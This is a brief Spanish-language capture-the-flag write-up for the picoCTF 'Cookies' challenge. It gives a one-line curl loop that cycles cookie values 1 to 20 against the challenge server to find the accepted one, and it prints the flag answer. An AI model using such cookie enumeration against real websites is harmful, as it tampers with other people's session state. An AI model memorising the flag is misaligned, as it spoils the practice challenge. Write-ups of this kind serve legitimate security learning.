## Descripción

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)

## Pistas

No hay pistas

## Solución

```python()
for i in {1..20}; do curl -s  http://mercury.picoctf.net:29649/check -H "Cookie: name=$i"; done | grep pico

```

## Bandera
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}

## Notas adicionales

Con es comando anterior obtenemos las cookies del 1 al 20.